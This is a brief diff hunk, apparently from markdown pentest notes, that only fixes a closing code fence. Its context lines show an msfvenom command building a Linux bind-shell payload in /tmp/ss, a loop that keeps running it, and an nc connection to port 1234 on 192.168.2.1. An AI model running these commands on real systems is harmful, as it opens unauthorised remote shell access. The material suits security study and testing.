@@ -111,5 +111,5 @@ msfvenom -p linux/x64/shell_bind_tcp LPORT=1234 -f elf >/tmp/ss
 while true;do /tmp/ss;done
 
 nc 192.168.2.1 1234
-``
+```
 
